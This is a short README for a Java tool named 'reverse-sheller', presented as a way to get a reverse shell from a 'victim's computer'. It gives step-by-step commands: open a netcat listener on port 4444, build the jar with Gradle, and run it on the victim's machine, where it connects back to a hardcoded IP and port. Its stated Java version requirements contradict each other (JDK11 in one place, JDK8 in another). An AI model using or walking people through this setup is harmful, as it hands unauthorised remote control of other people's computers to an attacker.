# reverse-sheller

Build and execute this .jar on target machine with JDK11 or above to get a reverse shell from your host.

![Reverse shell terminal picture](imgs/reverse-shell-picture.jpg)

## Usage 💡

1) Open server waiting for client connection. From this terminal you will be able to execute reverse shell commands:
```bash
nc -lvnp 4444
```

2) Build `.jar` using:
```bash
./gradlew build
```

3) Grab the `.jar` from `./build/libs` and execute it on the victims computer using: 
```bash
java -jar <filename.jar>
```

(Requirement: JDK8 or higher need 
to be installed on victims computer, and JAVA_HOME variable needs to be pointing to working JDK instance)

## About 💁📙

The IP and port is currently hardcoded.
...
...

## TODO 📝

Things that need to be done:
1) ...
2) ...
3) ...
...


![README ending picture](imgs/readme-ending-picture.jpg)

## Author 👷

Drop me a line at: rojberr@outlook.com 